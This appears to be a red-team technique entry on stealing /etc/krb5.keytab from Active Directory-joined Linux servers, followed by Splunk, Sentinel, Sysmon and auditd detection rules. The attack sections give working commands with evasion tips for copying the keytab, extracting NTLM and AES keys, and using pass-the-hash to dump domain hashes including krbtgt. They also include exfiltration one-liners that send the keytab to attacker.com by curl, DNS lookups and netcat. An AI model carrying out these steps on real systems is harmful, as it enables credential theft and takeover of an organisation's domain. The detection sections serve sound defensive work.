# [CA-UNSC-001]: /etc/krb5.keytab extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-001 |
| **MITRE ATT&CK v18.1** | [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Linux/Unix |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | All Linux distributions with Kerberos support (RHEL 6-9, Ubuntu 18.04-24.04, Debian, SUSE) |
| **Patched In** | N/A - Configuration hardening required |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Section 6 (Atomic Red Team) not included because no specific atomic test exists for keytab extraction (though T1552.004 framework is applicable). All remaining section numbers have been dynamically renumbered.

---

## 2. EXECUTIVE SUMMARY

- **Concept:** The `/etc/krb5.keytab` file stores Kerberos service principal credentials for systems integrated with Active Directory or Kerberos realms. This file contains encrypted keys (RC4-HMAC, AES128, AES256) that are cryptographically equivalent to the service account's password. When an attacker gains root access to a Linux system, they can extract these keys and derive NTLM hashes (from RC4-HMAC encryption type 23), which are then reusable for authentication without needing the plaintext password. This technique is particularly effective in hybrid environments where Linux servers are joined to Windows Active Directory domains, as the extracted credentials can be used for lateral movement across both Linux and Windows infrastructure via pass-the-hash or pass-the-ticket attacks.

- **Attack Surface:** `/etc/krb5.keytab` file (default path), service principal keytab files in application directories, Kerberos credential cache files.

- **Business Impact:** **Complete compromise of service accounts and potential domain-wide privilege escalation**. Attackers can authenticate as high-privilege service accounts (SQL Server, web servers, backup services) without triggering password change alerts. Extracted keys remain valid until the service account password is reset in Active Directory, which may be months or years in poorly maintained environments.

- **Technical Context:** Extraction takes seconds with root access. Detection likelihood is low unless file access auditing (auditd) is configured. Keys are persistent and do not expire independently of the AD password policy. A single compromised Linux server can expose credentials for dozens of service accounts if multiple keytabs exist.

### Operational Risk

- **Execution Risk:** Low - Simple file read operation with no system instability
- **Stealth:** High - File access does not trigger default security alerts; appears as legitimate root activity
- **Reversibility:** Yes - Key rotation requires Active Directory password reset and keytab regeneration

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|
| **CIS Benchmark** | 6.1.6 | Ensure permissions on /etc/shadow are configured (analogous keytab protection) |
| **DISA STIG** | V-230312 | RHEL must protect the confidentiality and integrity of transmitted information |
| **CISA SCuBA** | AC-3 | Access Enforcement - Restrict privileged file access |
| **NIST 800-53** | IA-5(7) | Authenticator Management - No embedded unencrypted static authenticators |
| **GDPR** | Art. 32(1)(a) | Security of Processing - Encryption of personal data |
| **DORA** | Art. 9.4(d) | Protection and prevention - Cryptographic key protection |
| **NIS2** | Art. 21.2(c) | Cyber risk management - Cryptographic controls |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | 8.3.3 | Risk Scenario - Compromise of cryptographic keys |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Root (UID 0) or equivalent via sudo/capability CAP_DAC_READ_SEARCH
- **Required Access:** Local shell access or remote command execution with privilege escalation

**Supported Versions:**
- **Linux Distributions:** RHEL/CentOS 6-9, Ubuntu 18.04-24.04, Debian 9-12, SUSE SLES 12-15, Oracle Linux 7-9
- **Kerberos:** MIT Kerberos 5 (krb5-libs), Heimdal Kerberos (all versions)
- **Other Requirements:** System must be joined to Active Directory (realmd/SSSD) or Kerberos realm

- **Tools:**
    - [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) (Python 3.6+)
    - [Impacket](https://github.com/fortra/impacket) (v0.10.0+)
    - klist (native - part of krb5-workstation package)
    - cat/xxd (native Linux utilities)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### Management Station / PowerShell Reconnaissance

```bash
# Check if system is domain-joined
realm list

# Check for keytab file existence
ls -lah /etc/krb5.keytab

# Check file permissions (should be 600)
stat /etc/krb5.keytab

# List keytab entries without extracting keys
klist -kt /etc/krb5.keytab

# Check for additional keytab files
find /etc /opt /var -name "*.keytab" 2>/dev/null

# Verify Kerberos configuration
cat /etc/krb5.conf | grep -E 'default_realm|kdc'

# Check SSSD configuration (domain join method)
cat /etc/sssd/sssd.conf 2>/dev/null | grep -E 'krb5_keytab|ad_domain'
```

**What to Look For:**
- If `realm list` shows a configured domain → System is AD-joined and likely has keytab
- File permissions other than `600` or `400` → Misconfiguration vulnerability
- Multiple keytab files → More service accounts to extract
- Realm name matches corporate Active Directory domain → High-value target
- SSSD configuration reveals AD domain and authentication method

**Version Note:** RHEL 7+ and Ubuntu 18.04+ use `realmd` for AD join. Older systems may use manual configuration with `net ads join`.

**Command (RHEL 6/CentOS 6 - Legacy):**
```bash
# Older systems use net ads testjoin
net ads testjoin

# Check samba winbind
wbinfo -t
```

**Command (RHEL 7+ / Ubuntu 18.04+):**
```bash
# Modern realm-based join
realm list -n

# Check systemd-resolved for DNS
resolvectl status
```

#### Windows Management Station (If Managing Linux from Windows)

```powershell
# Use SSH or PSRemoting to Linux target
$session = New-SSHSession -ComputerName linuxserver.contoso.com -Credential (Get-Credential)
Invoke-SSHCommand -SessionId $session.SessionId -Command "klist -kt /etc/krb5.keytab"

# Alternative: CrackMapExec for initial enumeration
crackmapexec ssh 192.168.1.0/24 -u admin -p password --exec "ls -la /etc/krb5.keytab"
```

**What to Look For:**
- SSH access as root or sudo-enabled user
- File existence confirms Kerberos integration

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: KeyTabExtract Tool (Python - Linux/macOS)

**Supported Versions:** All Linux distributions with Python 3.6+

#### Step 1: Transfer Keytab to Attack System

**Objective:** Exfiltrate the keytab file for offline analysis

**Command:**
```bash
# On compromised Linux system (as root):
base64 /etc/krb5.keytab > /tmp/keytab.b64

# Transfer via any method (scp, nc, copy-paste)
scp /tmp/keytab.b64 attacker@10.0.0.5:/tmp/

# On attacker system:
base64 -d /tmp/keytab.b64 > /tmp/target.keytab
```

**Alternative (Direct Copy):**
```bash
# If you have SSH/SCP access
scp root@target:/etc/krb5.keytab /tmp/target.keytab

# Or using netcat
# On attacker: nc -lvnp 4444 > target.keytab
# On target: cat /etc/krb5.keytab | nc 10.0.0.5 4444
```

**Expected Output:**
```
target.keytab                             100%  1234    1.2KB/s   00:00
```

**What This Means:**
- File successfully transferred
- File size >100 bytes indicates valid keytab (empty files are ~20 bytes)

**OpSec & Evasion:**
- Use memory-only operations: `cat /etc/krb5.keytab | base64` (no disk write)
- Encode transfer as HTTP POST to blend with legitimate traffic
- Delete `/tmp/keytab.b64` after transfer: `shred -u /tmp/keytab.b64`
- Detection likelihood: **Medium** if SIEM monitors file access to /etc/krb5.keytab

**Troubleshooting:**
- **Error:** `Permission denied`
  - **Cause:** Not running as root
  - **Fix:** `sudo cat /etc/krb5.keytab | base64` or escalate privileges

#### Step 2: Extract NT Hashes with KeyTabExtract

**Objective:** Parse keytab binary format and extract reusable NTLM hashes

**Command:**
```bash
# Clone KeyTabExtract tool
git clone https://github.com/sosdave/KeyTabExtract.git
cd KeyTabExtract

# Run extraction
python3 keytabextract.py /tmp/target.keytab
```

**Expected Output:**
```
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : CONTOSO.COM
	SERVICE PRINCIPAL : HTTP/webserver.contoso.com
	NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0
	AES-256 HASH : a1b2c3d4e5f6...
```

**What This Means:**
- **REALM**: Active Directory domain (CONTOSO.COM)
- **SERVICE PRINCIPAL**: Kerberos identity (HTTP/webserver = IIS or Apache service account)
- **NTLM HASH**: Reusable credential for pass-the-hash attacks
- **AES-256 HASH**: Kerberos encryption key (can be used with `-aesKey` in Impacket)

**OpSec & Evasion:**
- Perform extraction on isolated attacker system (not on target)
- Hash extraction is entirely offline - no network traffic generated
- Detection likelihood: **None** (offline operation)

**Troubleshooting:**
- **Error:** `[!] No RC4-HMAC located. Unable to extract NTLM hashes.`
  - **Cause:** Keytab only contains AES keys (modern AD configuration)
  - **Fix:** Use AES-256 hash instead: `impacket-wmiexec -aesKey <AES256_HASH> DOMAIN/user@target`
  
- **Error:** `[!] Only Keytab versions 0502 are supported.`
  - **Cause:** Heimdal Kerberos keytab (different format)
  - **Fix:** Use `klist -kte /tmp/target.keytab` to view keys, then manual extraction

**References & Proofs:**
- [KeyTabExtract Official Repository](https://github.com/sosdave/KeyTabExtract)
- [HackTricks - Linux Active Directory](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory)
- [SpecterOps - Kerberos Abuse on Linux](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

#### Step 3: Use Extracted Hash for Lateral Movement

**Objective:** Authenticate to Windows/Linux systems using pass-the-hash

**Command (Linux Target):**
```bash
# CrackMapExec (supports Kerberos)
crackmapexec smb 192.168.1.0/24 -u svc_web -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CONTOSO.COM

# Impacket wmiexec
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CONTOSO/svc_web@192.168.1.50

# Impacket secretsdump (dump NTDS.dit)
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CONTOSO/svc_web@dc01.contoso.com
```

**Command (Using AES Key Instead):**
```bash
# Impacket with AES256 key (stealthier - no NTLM downgrade)
export KRB5CCNAME=/tmp/krb5cc_1000
impacket-getTGT -aesKey a1b2c3d4e5f6... CONTOSO.COM/svc_web

# Use the TGT for authentication
impacket-secretsdump -k -no-pass CONTOSO/svc_web@dc01.contoso.com
```

**Expected Output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1234567890abcdef1234567890abcdef:::
```

**What This Means:**
- Successfully authenticated as `svc_web` service account
- Dumped Active Directory hashes (including krbtgt for Golden Ticket)

**OpSec & Evasion:**
- Use AES keys instead of NTLM to avoid "NTLM downgrade" alerts
- Authenticate during business hours to blend with legitimate service account activity
- Use Kerberos (`-k` flag) to avoid NTLM authentication events (Event ID 4776)
- Detection likelihood: **Medium** - Service account authentication from unusual IP may trigger alerts

**Troubleshooting:**
- **Error:** `KDC_ERR_PREAUTH_FAILED`
  - **Cause:** Hash is incorrect or account password changed
  - **Fix:** Re-extract keytab or verify account status: `net user svc_web /domain`

- **Error:** `KDC_ERR_C_PRINCIPAL_UNKNOWN`
  - **Cause:** Service principal name mismatch
  - **Fix:** Use full UPN: `svc_web@CONTOSO.COM` instead of `CONTOSO\svc_web`

**References & Proofs:**
- [Impacket Examples Documentation](https://github.com/fortra/impacket/tree/master/examples)
- [Red Team Notes - Pass The Hash](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntlm-hash-theft-pass-the-hash-attacks)

---

### METHOD 2: Native klist Utility (Linux/Unix)

**Supported Versions:** All systems with krb5-workstation package

#### Step 1: List Keytab Entries

**Objective:** Enumerate service principals without extracting keys

**Command:**
```bash
# Basic listing
klist -kt /etc/krb5.keytab

# Detailed output with encryption types
klist -kte /etc/krb5.keytab
```

**Expected Output:**
```
Keytab name: FILE:/etc/krb5.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   2 12/01/2024 10:30:00 HTTP/webserver.contoso.com@CONTOSO.COM
   2 12/01/2024 10:30:00 HTTP/webserver.contoso.com@CONTOSO.COM
   2 12/01/2024 10:30:00 HTTP/webserver.contoso.com@CONTOSO.COM
```

**Command (RHEL 7+ / Ubuntu 18.04+ - Show Encryption Types):**
```bash
klist -kte /etc/krb5.keytab
```

**Expected Output:**
```
Keytab name: FILE:/etc/krb5.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------ 
   2 12/01/2024 10:30:00 HTTP/webserver@CONTOSO.COM (aes256-cts-hmac-sha1-96)
   2 12/01/2024 10:30:00 HTTP/webserver@CONTOSO.COM (aes128-cts-hmac-sha1-96)
   2 12/01/2024 10:30:00 HTTP/webserver@CONTOSO.COM (arcfour-hmac)
```

**What This Means:**
- `KVNO 2`: Key Version Number (increments with each password change)
- `arcfour-hmac`: RC4-HMAC (encryption type 23) - contains extractable NTLM hash
- `aes256-cts`: AES256 (encryption type 18) - modern secure encryption
- Multiple entries = multiple encryption types for same principal (compatibility)

**OpSec & Evasion:**
- `klist` command is logged by auditd if EXECVE auditing enabled
- Appears as normal administrative activity
- Does not expose actual keys/hashes
- Detection likelihood: **Low** (legitimate admin command)

**Troubleshooting:**
- **Error:** `klist: No credentials cache found`
  - **Cause:** Wrong command syntax (use `-k` for keytab)
  - **Fix:** `klist -kt /etc/krb5.keytab` (note the `-t` flag)

**References & Proofs:**
- [MIT Kerberos Documentation - klist](https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/klist.html)
- [Red Hat Documentation - Managing Keytabs](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_and_managing_identity_management/maintaining-keytabs_configuring-and-managing-idm)

#### Step 2: Manual Hex Extraction (Advanced)

**Objective:** Manually parse keytab binary format when tools unavailable

**Command:**
```bash
# Dump keytab as hex
xxd /etc/krb5.keytab | head -n 50

# Look for RC4-HMAC marker (0x00170010) followed by 16-byte hash
xxd /etc/krb5.keytab | grep -A 2 "0017 0010"

# Extract NTLM hash bytes (manual parsing)
```

**Expected Output:**
```
00000000: 0502 0000 002f 0000 0001 000b 434f 4e54  ...../......CONT
00000010: 4f53 4f2e 434f 4d00 0000 0001 0004 4854  OSO.COM.......HT
00000020: 5450 0000 0009 7765 6273 6572 7665 7200  TP....webserver.
00000030: 0000 0001 0017 0010 31d6 cfe0 d16a e931  ........1....j.1
00000040: b73c 59d7 e0c0 89c0                      .<Y.....
```

**What This Means:**
- `0502`: Keytab version 5.2
- `CONTOSO.COM`: Kerberos realm
- `HTTP/webserver`: Service principal
- `0017 0010`: RC4-HMAC encryption type marker
- Following 16 bytes: NTLM hash (`31d6cfe0d16ae931b73c59d7e0c089c0`)

**OpSec & Evasion:**
- Entirely offline operation after keytab acquisition
- No tool dependencies (native Linux utilities)
- Detection likelihood: **None** (offline analysis)

**Troubleshooting:**
- **Error:** No `0017 0010` marker found
  - **Cause:** No RC4-HMAC keys in keytab (AES-only configuration)
  - **Fix:** Extract AES keys using marker `0012 0020` (AES256) or `0011 0010` (AES128)

**References & Proofs:**
- [MIT Kerberos Keytab File Format](https://repo.or.cz/w/krb5dissect.git/blob_plain/HEAD:/keytab.txt)
- [Keytab Binary Structure Analysis](https://malicious.link/posts/2018/pass-the-hash-with-kerberos/)

---

### METHOD 3: Impacket getTGT Direct Keytab Read

**Supported Versions:** Impacket 0.10.0+

#### Step 1: Extract Kerberos Ticket Using Keytab

**Objective:** Request TGT directly from Active Directory using keytab file

**Command:**
```bash
# Copy keytab to attacker system
scp root@target:/etc/krb5.keytab /tmp/target.keytab

# Use Impacket getTGT with keytab
impacket-getTGT -k -no-pass CONTOSO.COM/HTTP/webserver.contoso.com -keytab /tmp/target.keytab

# Export credential cache
export KRB5CCNAME=/tmp/HTTP_webserver.contoso.com.ccache

# Use TGT for authentication
impacket-secretsdump -k -no-pass @dc01.contoso.com
```

**Expected Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Target system bootKey: 0x1234567890abcdef1234567890abcdef
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**What This Means:**
- Impacket parsed the keytab and extracted encryption keys
- Requested TGT from AD KDC using service principal credentials
- Successfully authenticated without needing plaintext password or manual hash extraction

**OpSec & Evasion:**
- Uses native Kerberos authentication (Event ID 4768) - appears legitimate
- No NTLM authentication (avoids Event ID 4776 alerts)
- Service account authentication from unusual IP may still trigger behavioral analytics
- Detection likelihood: **Low-Medium** depending on baseline behavior

**Troubleshooting:**
- **Error:** `Kerberos SessionError: KRB_AP_ERR_SKEW`
  - **Cause:** Time skew >5 minutes between attacker and DC
  - **Fix:** Sync time with DC: `ntpdate dc01.contoso.com` or `timedatectl set-ntp true`

- **Error:** `[-] Key for user HTTP/webserver.contoso.com@CONTOSO.COM not found in keytab`
  - **Cause:** Principal name format mismatch
  - **Fix:** Check exact format with `klist -kt target.keytab` and use verbatim

**References & Proofs:**
- [Impacket getTGT Documentation](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)
- [Abusing Kerberos from Linux](https://onsecurity.io/article/abusing-kerberos-from-linux/)

---

## 7. TOOLS & COMMANDS REFERENCE

#### [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

**Version:** 1.0 (Python 3 port)
**Minimum Version:** Python 3.6
**Supported Platforms:** Linux, macOS, Windows (with Python)

**Version-Specific Notes:**
- Original version: Python 2.7 (deprecated)
- Current version: Python 3.6+ (maintained by community fork [keytabextractor2](https://github.com/dnem0x0/keytabExtractor2))
- Supports keytab format version 5.2 only (standard format)

**Installation:**
```bash
git clone https://github.com/sosdave/KeyTabExtract.git
cd KeyTabExtract
# No dependencies required - uses only Python stdlib
```

**Usage:**
```bash
# Basic extraction
python3 keytabextract.py /path/to/keytab

# Example output parsing
python3 keytabextract.py krb5.keytab | grep "NTLM HASH" | awk '{print $4}'
```

#### [Impacket](https://github.com/fortra/impacket)

**Version:** 0.12.0 (latest as of 2025)
**Minimum Version:** 0.9.24 (for keytab support)
**Supported Platforms:** Linux, macOS, Windows (Python)

**Installation:**
```bash
# Via pip (recommended)
pip3 install impacket

# From source
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
```

**Usage:**
```bash
# Pass-the-hash
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN/user@target

# Pass-the-ticket with keytab
impacket-getTGT -k -no-pass DOMAIN/user -keytab file.keytab

# Kerberos authentication with AES key
impacket-secretsdump -k -no-pass -aesKey <HEX_KEY> @dc.domain.com
```

#### Script (One-Liner - Keytab Exfiltration)

```bash
# Memory-only exfiltration via DNS (requires dnscat2 or similar)
cat /etc/krb5.keytab | base64 -w0 | while read line; do nslookup $line.attacker.com; done

# HTTP POST exfiltration
curl -X POST -d @/etc/krb5.keytab https://attacker.com/upload

# Netcat exfiltration
cat /etc/krb5.keytab | nc attacker.com 4444
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Linux Keytab File Access Monitoring

**Rule Configuration:**
- **Required Index:** `linux_audit` or `os:linux`
- **Required Sourcetype:** `linux:audit` or `auditd`
- **Required Fields:** `proctitle`, `name`, `exe`, `uid`
- **Alert Threshold:** Any access from non-root UID or unusual process
- **Applies To Versions:** All Linux versions with auditd

**SPL Query:**
```spl
index=linux_audit sourcetype="linux:audit" type=PATH name="/etc/krb5.keytab" 
| search NOT exe="/usr/bin/klist" NOT exe="/usr/bin/kinit" 
| eval user=if(uid="0","root",user) 
| stats count min(_time) as firstTime max(_time) as lastTime values(exe) as executed_process by host user name 
| where count > 0 
| convert ctime(firstTime) ctime(lastTime) 
| table firstTime lastTime host user executed_process name count
```

**What This Detects:**
- Any file access to `/etc/krb5.keytab` by non-standard processes
- Excludes legitimate Kerberos utilities (`klist`, `kinit`)
- Groups by user and process for behavioral analysis
- Highlights unusual access patterns (e.g., `cat`, `xxd`, `python`, `scp`)

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Set **Search**: Paste the SPL query above
5. Set **Trigger Condition**: Number of Results > 0
6. Set **Time Range**: Run every 5 minutes, search last 10 minutes
7. Configure **Action** → Send email to SOC team
8. Set **Severity**: High
9. Click **Save**

**Source:** Adapted from [Splunk Research - Linux Credential File Access](https://research.splunk.com/endpoint/0419cb7a-57ea-467b-974f-77c303dfe2a3/)

#### False Positive Analysis

- **Legitimate Activity:** Administrators running `klist -kt` for troubleshooting, automated Kerberos ticket renewal scripts
- **Benign Tools:** Configuration management tools (Ansible, Puppet) may read keytab during service deployment
- **Tuning:** 
  - Exclude known admin usernames: `| where user!="ansible_admin"`
  - Exclude configuration management processes: `| search NOT exe="/usr/bin/puppet"`
  - Baseline normal access patterns for 2 weeks before alerting

---

#### Rule 2: Suspicious Command Execution After Keytab Access

**Rule Configuration:**
- **Required Index:** `linux_audit`
- **Required Sourcetype:** `linux:audit`
- **Required Fields:** `proctitle`, `name`, `exe`, `syscall`
- **Alert Threshold:** File access followed by network tool execution within 60 seconds
- **Applies To Versions:** All Linux versions

**SPL Query:**
```spl
index=linux_audit sourcetype="linux:audit"
| transaction host maxspan=60s 
| search name="/etc/krb5.keytab" AND (exe="/usr/bin/scp" OR exe="/usr/bin/nc" OR exe="/usr/bin/curl" OR exe="/usr/bin/base64" OR proctitle="*impacket*" OR proctitle="*crackmapexec*") 
| stats count by host user exe proctitle 
| table host user exe proctitle count
```

**What This Detects:**
- Keytab access followed by data exfiltration tools (scp, nc, curl)
- Encoding activity (base64) indicating preparation for exfiltration
- Use of post-exploitation frameworks (impacket, crackmapexec)
- Temporal correlation within 60-second window

**Manual Configuration Steps:**
1. Navigate to **Splunk Enterprise Security** → **Content** → **Content Management**
2. Click **Create New Content** → **Correlation Search**
3. Paste the SPL query
4. Set **Schedule**: Every 5 minutes
5. Set **Earliest**: -10m, **Latest**: now
6. Enable **Notable Event**:
   - Title: `Keytab Exfiltration Attempt Detected on $host$`
   - Severity: Critical
   - Security Domain: Access
7. Configure **Adaptive Response Actions**:
   - Run endpoint isolation script
   - Create ServiceNow incident
8. Click **Save**

**Source:** Custom rule based on [Splunk Boss of the SOC (BOTS) scenarios](https://www.splunk.com/en_us/blog/security/boss-of-the-soc-2023.html)

#### False Positive Analysis

- **Legitimate Activity:** Keytab backup operations by administrators, Kerberos key rotation automation
- **Benign Tools:** Centralized backup solutions (Bacula, rsync) may legitimately copy keytab files
- **Tuning:** 
  - Whitelist known backup scripts: `| search NOT proctitle="*/opt/backup/*"`
  - Require multiple indicators: Modify to alert only if 3+ suspicious actions occur
  - Correlate with recent privilege escalation events for higher confidence

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Linux Keytab Access from Syslog

**Rule Configuration:**
- **Required Table:** `Syslog`
- **Required Fields:** `SyslogMessage`, `Computer`, `Facility`, `ProcessName`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Linux systems with rsyslog/syslog-ng forwarding to Sentinel

**KQL Query:**
```kusto
Syslog
| where TimeGenerated > ago(10m)
| where Facility == "authpriv" or Facility == "audit"
| where SyslogMessage contains "/etc/krb5.keytab" or SyslogMessage contains "krb5.keytab"
| where SyslogMessage !contains "klist" and SyslogMessage !contains "kinit"
| extend SuspiciousProcess = extract(@"exe=""([^""]+)""", 1, SyslogMessage)
| extend AccessType = extract(@"perm=([a-z]+)", 1, SyslogMessage)
| where SuspiciousProcess !in ("klist", "kinit", "kdestroy")
| project TimeGenerated, Computer, ProcessName, SuspiciousProcess, AccessType, SyslogMessage
| order by TimeGenerated desc
```

**What This Detects:**
- Syslog entries indicating file access to keytab from auditd
- Filters out legitimate Kerberos utilities
- Extracts process name and access type (read/write/attribute)
- Highlights non-standard processes accessing sensitive credential files

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Linux Keytab Unauthorized Access`
   - Severity: `High`
   - MITRE ATT&CK: `T1552.004 (Credential Access - Private Keys)`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `10 minutes`
   - Alert threshold: `Results > 0`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group all alerts into single incident: Disabled (each alert = separate incident)
7. **Automated response Tab:**
   - Add playbook: `Isolate-LinuxEndpoint`
8. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel workspace
Connect-AzAccount
$ResourceGroup = "rg-sentinel-prod"
$WorkspaceName = "law-sentinel-prod"

# Create the analytics rule
$Query = @"
Syslog
| where TimeGenerated > ago(10m)
| where Facility == "authpriv" or Facility == "audit"
| where SyslogMessage contains "/etc/krb5.keytab"
| where SyslogMessage !contains "klist"
| extend SuspiciousProcess = extract(@"exe=""([^""]+)""", 1, SyslogMessage)
| project TimeGenerated, Computer, ProcessName, SuspiciousProcess, SyslogMessage
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Linux Keytab Unauthorized Access" `
  -Query $Query `
  -Severity "High" `
  -Enabled $true `
  -QueryFrequency "PT5M" `
  -QueryPeriod "PT10M" `
  -TriggerOperator "GreaterThan" `
  -TriggerThreshold 0
```

**Source:** Custom query based on [Microsoft Sentinel Community GitHub](https://github.com/Azure/Azure-Sentinel/tree/master/Detections/Syslog)

---

## 10. WINDOWS EVENT LOG MONITORING

**Note:** This technique is Linux-specific. Windows Event Log monitoring applies to Windows-based Kerberos credential theft (e.g., LSASS dumping). For Linux credential access, use **auditd** and **syslog** as described in Sections 8 and 9.

**Relevant Windows Monitoring (for hybrid attacks):**

**Event ID: 4768 (Kerberos Authentication - TGT Request)**
- **Log Source:** Security
- **Trigger:** Service principal from Linux keytab requests TGT from Windows DC
- **Filter:** Look for unusual client IPs (Linux servers), service account names
- **Applies To Versions:** Windows Server 2012-2025

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Domain Controllers OU** → **Default Domain Controllers Policy**
3. Go to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
4. Enable: **Audit Kerberos Authentication Service** (Success and Failure)
5. Run `gpupdate /force` on Domain Controllers

---

## 11. SYSMON DETECTION PATTERNS

**Note:** Sysmon is Windows-specific. For Linux, use **auditd** rules instead (see Section 12 below for equivalent Linux auditd configuration).

For Windows-side detection when stolen Linux keytab credentials are used against Windows systems:

**Minimum Sysmon Version:** 15.0+
**Supported Platforms:** Windows Server 2012-2025

```xml
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Detect lateral movement from Linux systems using stolen keytabs -->
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">88</DestinationPort> <!-- Kerberos -->
      <Image condition="contains">lsass.exe</Image>
    </NetworkConnect>
    
    <!-- Detect unusual process accessing Kerberos tickets after Linux authentication -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="end with">lsass.exe</TargetImage>
      <GrantedAccess>0x1010</GrantedAccess> <!-- PROCESS_VM_READ -->
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-keytab-defense.xml` with the XML above
3. Install Sysmon with the config on Domain Controllers:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-keytab-defense.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 12. LINUX AUDITD CONFIGURATION

**Minimum auditd Version:** 2.8+ (RHEL 7+)
**Supported Platforms:** All Linux distributions

```bash
# /etc/audit/rules.d/keytab-monitoring.rules

## Monitor all accesses to keytab files
-w /etc/krb5.keytab -p war -k keytab_access
-w /etc/ -p war -k keytab_wildcard -F path=/etc/*.keytab

## Monitor common service keytab locations
-w /etc/httpd/conf/ipa.keytab -p war -k apache_keytab
-w /etc/dirsrv/ -p war -k ldap_keytab
-w /var/kerberos/krb5/ -p war -k kerberos_lib

## Monitor execution of keytab extraction tools
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/python3 -F a0="keytabextract" -k keytab_extraction
-a always,exit -F arch=b64 -S execve -F a0="xxd" -F a1="/etc/krb5.keytab" -k keytab_hex_dump

## Monitor suspicious file reads by non-kerberos processes
-a always,exit -F arch=b64 -S open -S openat -F path=/etc/krb5.keytab -F success=1 -F exe!=/usr/bin/klist -F exe!=/usr/bin/kinit -k suspicious_keytab_read
```

**Manual Configuration Steps:**
1. Create the rules file:
   ```bash
   sudo nano /etc/audit/rules.d/keytab-monitoring.rules
   ```
2. Paste the rules above
3. Load the rules:
   ```bash
   sudo augenrules --load
   # Or on older systems:
   sudo service auditd restart
   ```
4. Verify rules are active:
   ```bash
   sudo auditctl -l | grep keytab
   ```
5. Test detection (as root):
   ```bash
   cat /etc/krb5.keytab > /dev/null
   ```
6. Check audit log:
   ```bash
   sudo ausearch -k keytab_access -i
   ```

**Expected Output:**
```
type=PATH msg=audit(01/06/2026 10:15:32.123:4567) : item=0 name=/etc/krb5.keytab inode=123456 dev=08:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=SYSCALL msg=audit(01/06/2026 10:15:32.123:4567) : arch=x86_64 syscall=openat success=yes exit=3 a0=0xffffff9c a1=0x7ffd1234 a2=O_RDONLY a3=0x0 items=1 ppid=1234 pid=5678 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=cat exe=/usr/bin/cat key=keytab_access
```

---

## 13. MICROSOFT DEFENDER FOR CLOUD

